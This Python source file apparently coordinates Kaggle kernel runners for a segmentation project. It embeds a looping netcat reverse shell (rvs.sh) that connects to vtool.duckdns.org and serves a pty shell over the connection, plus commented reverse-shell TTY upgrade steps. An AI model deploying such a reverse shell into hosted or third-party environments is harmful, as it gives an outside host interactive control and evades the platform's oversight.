import json
import os
import re
import shutil
import subprocess
from string import Template

import pysnooper
import slug

import utils

setup_pty_str = r"""import argparse
import os
import pty
import sys
import time

parser = argparse.ArgumentParser()
parser.add_argument('-a', dest='append', action='store_true')
parser.add_argument('-p', dest='use_python', action='store_true')
parser.add_argument('filename', nargs='?', default='typescript')
parser.add_argument('logfilename', nargs='?', default='typescript')
options = parser.parse_args()

shell = sys.executable if options.use_python else os.environ.get('SHELL', 'sh')
filename = options.filename
logfilename = options.logfilename
mode = 'ab' if options.append else 'wb'

with open(filename, mode) as script:
    def read(fd):
        data = os.read(fd, 1024)
        script.write(data)
        return data

    with open(logfilename, mode) as logscript:
        def logread(fd):
            data = os.read(fd, 1024)
            logscript.write(data)
            return data

        print('Script started, file is', filename)
        script.write(('Script started on %s\n' % time.asctime()).encode())

        pty.spawn(shell, read, logread)

        script.write(('Script done on %s\n' % time.asctime()).encode())
        print('Script done, file is', filename)
"""

rvs_str = r"""#!/bin/bash
W=3

## https://stackoverflow.com/questions/57877451/retrieving-output-and-exit-code-of-a-coprocess
#coproc { sleep 30 && echo "Output" && exit 3; }
## Saving the coprocess's PID for later, as COPROC_PID apparently unsets when its finished
#COPROC_PID_backup=$COPROC_PID
#
## Retrieving the coprocess's output
#output=$(cat <&$COPROC)
#
## Retrieving the coprocess's exit code
#wait $COPROC_PID_backup
#
## Echoing out the results
#echo $?
#echo $output

waitfile() {
    while [ ! -f $1 ]; do
        sleep 1;
    done
}

echo BASH NOW: $$

PID_FILE_PATH=/tmp/nc.pid

# killall nc
while true; do
(
    coproc nc vtool.duckdns.org 23454;
    COPROC_PID_backup=$COPROC_PID;
    echo $COPROC_PID_backup > $PID_FILE_PATH
    # exec -l bash <&${COPROC[0]} >&${COPROC[1]} 2>&1;
    exec -l python setup_pty log_master log_log <&${COPROC[0]} >&${COPROC[1]} 2>&1;
)
    RSPID=$!
    wait $RSPID
    RSRET=$?
    [ x"$RSRET" == x"0" ] && exit 0

    waitfile $PID_FILE_PATH && \
    tail --pid=$(cat $PID_FILE_PATH) -f /dev/null && \
    rm $PID_FILE_PATH

    pgrep $RSPID && kill $RSPID
    echo "disconnected? We will retry in $W seconds."
    sleep $W;
done;

# https://medium.com/@6c2e6e2e/spawning-interactive-reverse-shells-with-tty-a7e50c44940e
## In reverse shell
#$ python -c 'import pty; pty.spawn("/bin/bash")'
#Ctrl-Z
#
## In Attacker console
#$ stty raw -echo
#$ fg
#
## In reverse shell
#$ reset
#$ export SHELL=bash
#$ export TERM=xterm-256color
#$ stty rows <num> columns <cols>
"""

rvs_pty_config_str = r"""#!/bin/bash
reset
export SHELL=bash
export TERM=xterm-256color
stty rows 30 columns 80

color_my_prompt () {
    local __user_and_host="\[\033[01;32m\]\u@\h"
    local __cur_location="\[\033[01;34m\]\w"
    local __git_branch_color="\[\033[31m\]"
    #local __git_branch="\`ruby -e \"print (%x{git branch 2> /dev/null}.grep(/^\*/).first || '').gsub(/^\* (.+)$/, '(\1) ')\"\`"
    local __git_branch='`git branch 2> /dev/null | grep -e ^* | sed -E  s/^\\\\\*\ \(.+\)$/\(\\\\\1\)\ /`'
    local __prompt_tail="\[\033[35m\]$"
    local __last_color="\[\033[00m\]"
    export PS1="$__user_and_host $__cur_location $__git_branch_color$__git_branch$__prompt_tail$__last_color "
}
color_my_prompt
"""

runner_src = """
#!/bin/bash
USER=$1
shift
REPO=$1
shift
BRANCH=$1
shift
PHASE=$1
shift
PARAMS=$@

apt install netcat -y

pip install pydicom
pip install parse  # should move local codes out
pip install pytest-logger pysnooper python_logging_rabbitmq  # for debugging

(test -d ${REPO} || git clone --single-branch --branch ${BRANCH} --depth=1 \
https://github.com/${USER}/${REPO}.git ${REPO} && pushd ${REPO} && \
find . -maxdepth 1 -name ".??*" -o -name "??*" | xargs -I{} mv {} $OLDPWD && popd) && \
{ if [ x"${PHASE}" != x"dev" ]; \
      then python main.py $PARAMS; \
  else \
      bash ./rvs.sh
  fi }
"""


class Coordinator:
    template_path = "runner_template/"
    """run in controller side, the runners run in dockers with GPUs"""

    def __init__(self, tmp_path, title_prefix):
        self.tmp_path = tmp_path
        self.runners = []
        self.title_prefix = title_prefix

    def push_all(self):
        for path in self.runners:
            self.push(path)

    @staticmethod
    def push(runner):
        "Push the code to server/kagger docker"
        utils.logger.debug(
            " ".join(["kaggle", "kernels", "push", "-p", runner]))
        return subprocess.run(["kaggle", "kernels", "push", "-p", runner])

    def push_listen(self):
        self.push_all()
        self._get_result()

    def _get_result(self, timeout):
        """use the message queue, just use this right after push, listen for
        result, debug local first"""
        "use RE change source code to add the log collector"

    @staticmethod
    def _change_kernel_meta_info(folder, name, script):
        with open(os.path.join(folder, "kernel-metadata.json"), "r+") as jf:
            data = json.load(jf)
            if not script:
                name = name + " nb"
            slug_name = slug.slug(name)
            data["id"] = re.sub(r"/.*", "/" + slug_name, data["id"])
            data["title"] = slug_name
            if not script:
                data["kernel_type"] = "notebook"
                data["code_file"] = "main.ipynb"
            else:
                data["kernel_type"] = "script"
                data["code_file"] = "main.py"
            jf.seek(0)
            json.dump(data, jf)
            jf.truncate()

    @staticmethod
    def _change_main_py(path, size, net, AMQPURL, seed):
        s = Template(
            f"""#!/usr/bin/env python3
import subprocess
with open("runner.sh", "w") as f:
    f.write(
        r\"\"\"{runner_src}\"\"\"
    )
with open("setup_pty", "w") as f:
    f.write(
        r\"\"\"{setup_pty_str}\"\"\"
    )
with open("rvs.sh", "w") as f:
    f.write(
        r\"\"\"{rvs_str}\"\"\"
    )
with open("rpt", "w") as f:
    f.write(
        r\"\"\"{rvs_pty_config_str}\"\"\"
    )

subprocess.run(
'bash -x runner.sh pennz PneumothoraxSegmentation dev dev "$AMQPURL" "$size" "$seed" "$network"', shell=True)

# %%
# #%run /opt/conda/bin/pytest --pdb -s -k "test_pytorch"
    """
        )
        d = dict(AMQPURL=AMQPURL.string(), size=size, network=net, seed=seed)
        ss = s.safe_substitute(d)
        print(ss)

        with open(os.path.join(path, "main.py"), "w") as jf:
            jf.write(ss)

    @pysnooper.snoop()
    def run_local(self, path):
        return subprocess.run("python " + os.path.join(path, "main.py"), shell=True)

    @pysnooper.snoop()
    def create_runner(self, config, seed="2020", script=True):
        """
        config will be size and model right now
        """
        size = config["size"]
        net = config["network"]
        name = net.replace("_", "-") + "-" + str(size)
        AMQPURL = config["AMQPURL"]

        path = os.path.join(self.tmp_path, name)
        shutil.copytree(self.template_path, path)
        self._change_kernel_meta_info(
            path, self.title_prefix + " " + name, script)
        self._change_main_py(path, size, net, AMQPURL, seed)
        if not script:
            subprocess.run(
                ("jupytext --to notebook " + os.path.join(path, "main.py")).split()
            )

        self.runners.append(path)

        return path
